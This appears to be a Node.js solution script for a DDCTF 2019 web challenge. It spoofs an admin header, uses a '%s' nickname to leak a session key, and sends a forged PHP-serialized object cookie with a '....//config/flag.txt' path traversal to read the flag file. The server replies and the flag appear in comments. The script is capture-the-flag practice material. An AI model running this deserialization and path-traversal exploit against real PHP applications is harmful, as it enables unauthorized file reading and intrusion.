const got = require('got')
const { CookieJar } = require('tough-cookie')

const createClient = () => {
  const jar = new CookieJar()
  return got.extend({
    headers: {
      didictf_username: 'admin',
    },
    cookieJar: jar,
  })
}

const FormData = require('form-data')

function serialize (body) {
  return body.replace(/}{/g, '}\n{').split('\n').map((str) => JSON.parse(str))
}

async function step1 () {
  const client = createClient()
  const response = await client.post('http://117.51.158.44/app/Auth.php')
  return serialize(response.body)[0]
}

async function step2 () {
  const client = createClient()
  const url = 'http://117.51.158.44/app/Session.php'

  // create session
  await client.post(url)

  // get the key
  let form = new FormData()
  form.append('nickname', '%s')

  let response = await client.post(url, {
    body: form,
  })

  console.log(response.body)

  return serialize(response.body)[1].data
}

/**
 * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14
 */
async function step4 () {
  const SESSION = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
  const client = createClient()
  const response = await client.post('http://117.51.158.44/app/Session.php', {
    headers: {
      didictf_username: 'admin',
      cookie: `ddctf_id=${encodeURIComponent(SESSION)};`,
    },
  })
  return serialize(response.body)[1].data
}

;(async () => {
  console.log('Step1: ---')
  console.log(await step1())
  // <- "您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php"

  console.log('Step2: ---')
  console.log(await step2())
  // <- "Welcome my friend EzblrbNS"

  console.log('Step3: ---')
  console.log('use serialize.php to do step3')

  console.log('Step4: ---')
  console.log(await step4())
  // <- "DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}"
})()
